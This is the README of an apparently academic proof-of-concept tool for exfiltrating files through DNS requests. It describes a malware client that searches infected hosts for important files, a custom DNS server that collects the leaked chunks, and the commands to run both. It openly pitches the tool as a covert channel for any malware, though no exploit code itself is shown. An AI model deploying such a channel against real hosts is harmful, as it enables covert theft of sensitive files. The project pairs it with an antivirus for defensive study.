# SwaggyPloop

This project contains a proof of concept for a data exfiltration method that operates by leaking data through DNS requests. This can be used as a component for any malware that needs a communication channel to export sensitive files. For technical and implementation details, please see the included paper.

* The `client` folder contains the code for a prototype malware client that searches an infected host for important files. It uses our communication infrastructure to leak these files through DNS requests.
* The `dns` folder contains our own custom fork of the `dnspython` library, which we use to form the DNS requests on the client side.
* The `dns_server` folder contains our custom DNS server that listens for incoming requests structured using to our custom request format and logs them in a database for later reconstruction.
* The `lib` folder contains code that handles the encoding and packet structuring when breaking apart the files for transit as well as the code for reconstructing them on the server side. This folder also contains utility code for logging and querying the database.
* The `web_interface` folder contains a demonstrative interface for viewing the data chunks logged in the database and allows for the reconstructed data to be visualized.

The accompanying antivirus can be found [here](https://github.com/CrMallard/Antibody)

## Setup
This project requires Python `>=3.5` and runs best on a 64-bit Ubuntu `>=14.04` image. We have no guarantees for any other versions or distributions.

### Custom DNS Server
```
pip install -r requirements.txt
sudo python dns_server/malware_server.py # sudo is required to use port 53
```

### Exfiltrating a file (proof of concept)
```
pip install -r requirements.txt
python client/malware_client.py <file> [ip address of dns server]
```

## Authors
* Alvin Lin (omgimanerd)
* Stefan Aleksic (ColdSauce)
* Chris Remillard (CrMallard)
